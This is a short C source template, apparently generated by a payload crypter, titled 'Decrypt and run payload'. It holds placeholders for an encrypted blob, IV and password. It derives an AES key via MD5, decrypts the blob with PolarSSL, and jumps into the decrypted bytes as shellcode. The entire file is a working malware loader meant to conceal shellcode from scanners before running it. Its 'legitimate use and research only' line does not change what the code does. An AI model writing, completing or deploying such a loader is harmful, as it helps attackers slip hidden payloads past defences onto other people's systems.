/*
 Decrypt and run payload
 Author Liviu I. 

 License http://creativecommons.org/licenses/by-sa/3.0/
 Legitimate use and research only
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "PolarSSL/aes.h"
#include "PolarSSL/md5.h"

int main(int argc, char **argv){
    unsigned char key[16];
    unsigned char iv[16] = %s;

    unsigned char input[] = %s;
    size_t input_len = %d;
    unsigned char output[%d];

    unsigned char passw[] = "%s";
    size_t in_len = %d;

    /* Generate a 128 bits key from the password */
    md5_context md5_ctx;
    md5_starts(&md5_ctx);
    md5_update(&md5_ctx, passw, in_len);
    md5_finish(&md5_ctx, key);

    /* Decrypt the payload */
    aes_context aes;
    aes_setkey_dec(&aes, key, 128);
    aes_crypt_cbc(&aes, AES_DECRYPT, input_len, iv, input, output);

    /* Execute decrypted shellcode */
    ((void (*)()) output)();
    return 0;
}
